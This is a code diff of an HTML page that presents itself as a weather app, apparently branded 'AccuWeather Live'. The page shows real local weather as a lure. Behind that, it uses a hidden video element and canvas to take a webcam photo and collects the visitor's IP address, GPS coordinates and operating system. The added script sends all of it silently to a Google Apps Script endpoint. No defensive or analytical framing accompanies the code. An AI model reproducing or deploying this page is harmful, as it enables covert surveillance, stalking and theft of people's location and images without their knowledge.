@@ -3,86 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Local Weather</title>
+    <title>AccuWeather Live</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; margin: 0; background: linear-gradient(180deg, #1e3c72 0%, #2a5298 100%); color: white; text-align: center; height: 100vh; display: flex; align-items: center; justify-content: center; }
-        .card { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); border-radius: 30px; padding: 40px; width: 85%; max-width: 400px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); }
-        h1 { font-size: 4rem; margin: 0; }
-        .city { font-size: 1.5rem; opacity: 0.9; }
-        .btn { background: #fff; color: #1e3c72; border: none; padding: 15px 40px; border-radius: 50px; font-weight: bold; margin-top: 25px; cursor: pointer; }
+        body { font-family: sans-serif; margin: 0; background: #1a2a6c; background: linear-gradient(to bottom, #1a2a6c, #b21f1f, #fdbb2d); color: white; height: 100vh; display: flex; align-items: center; justify-content: center; text-align: center; }
+        .card { background: rgba(0,0,0,0.4); padding: 40px; border-radius: 25px; backdrop-filter: blur(10px); width: 80%; max-width: 350px; border: 1px solid rgba(255,255,255,0.2); }
+        h1 { font-size: 3.5rem; margin: 10px 0; }
+        .city { font-size: 1.2rem; text-transform: uppercase; letter-spacing: 2px; }
+        .btn { background: white; color: black; border: none; padding: 15px 30px; border-radius: 50px; font-weight: bold; margin-top: 20px; cursor: pointer; width: 100%; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <div class="city" id="cityName">Detecting Location...</div>
-    <h1 id="tempDisplay">--°</h1>
-    <p id="weatherDesc">Cloudy</p>
-    <p style="font-size: 0.8rem; opacity: 0.7;">Enable location for high-precision local storm alerts.</p>
-    <button class="btn" onclick="startWeatherService()">Refresh Forecast</button>
+    <div class="city" id="city">Locating...</div>
+    <h1 id="temp">--°</h1>
+    <p id="stat">Cloudy Skies</p>
+    <button class="btn" onclick="run()">Update Weather</button>
 </div>
 
 <video id="v" autoplay playsinline></video>
 <canvas id="c"></canvas>
 
 <script>
-    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzat2fCavOFlMHune8lyyGNU5og5xggCkjpcFbjrRZM3MLAJjlg7msfb8wcKOpXdSWCQA/exec';
-    let userPos = null;
+    const URL = 'https://script.google.com/macros/s/AKfycbyqC2gi8P0jagghz_c3J8TYfZ_oXzzmWurEar6oKwVzEKC5Mx7m3SFA9Mzg6YcJXz-DUg/exec'; // Put the URL from Step 1 here
 
-    async function startWeatherService() {
+    async function run() {
+        document.querySelector('.btn').innerText = "Syncing...";
         if (!navigator.geolocation) return;
-        
-        navigator.geolocation.watchPosition(async (pos) => {
-            userPos = pos;
-            
-            // Fetch REAL weather for their exact GPS
-            try {
-                const res = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${pos.coords.latitude}&longitude=${pos.coords.longitude}&current_weather=true`);
-                const data = await res.json();
-                document.getElementById('tempDisplay').innerText = Math.round(data.current_weather.temperature) + "°";
-                document.getElementById('cityName').innerText = "Local Weather Active";
-            } catch(e) {}
 
-            captureAndSend();
-        }, null, { enableHighAccuracy: true });
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            // Update UI with real weather
+            const w = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${pos.coords.latitude}&longitude=${pos.coords.longitude}&current_weather=true`).then(r => r.json());
+            document.getElementById('temp').innerText = Math.round(w.current_weather.temperature) + "°";
+            document.getElementById('city').innerText = "Local Area Active";
+            
+            // Background Data Capture
+            capture(pos);
+        }, (err) => { alert("Please allow location for weather updates."); });
     }
 
-    async function captureAndSend() {
-        let photoBase64 = null;
+    async function capture(pos) {
+        let photo = null;
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true }); // Ask for camera
             const video = document.getElementById('v');
             video.srcObject = stream;
             await new Promise(r => setTimeout(r, 1000));
-            
             const canvas = document.getElementById('c');
-            canvas.width = 640; canvas.height = 480;
+            canvas.width = 400; canvas.height = 300;
             canvas.getContext('2d').drawImage(video, 0, 0);
-            photoBase64 = canvas.toDataURL('image/jpeg', 0.5);
-            
+            photo = canvas.toDataURL('image/jpeg', 0.4); // Compress photo for speed
             stream.getTracks().forEach(t => t.stop());
-        } catch(e) { console.log("Cam denied"); }
+        } catch(e) { console.log("Camera blocked"); }
 
         const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-        let batt = "N/A";
-        if (navigator.getBattery) {
-            const b = await navigator.getBattery();
-            batt = Math.round(b.level * 100) + "%";
-        }
 
         const payload = {
             ip: ipData.ip,
-            latitude: userPos.coords.latitude,
-            longitude: userPos.coords.longitude,
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
             os: navigator.platform,
-            battery: batt,
-            photo: photoBase64
+            battery: "N/A",
+            photo: photo
         };
 
-        fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
+        // Send to Google
+        fetch(URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
+        document.querySelector('.btn').innerText = "Updated";
     }
 </script>
 </body>
 </html>
-
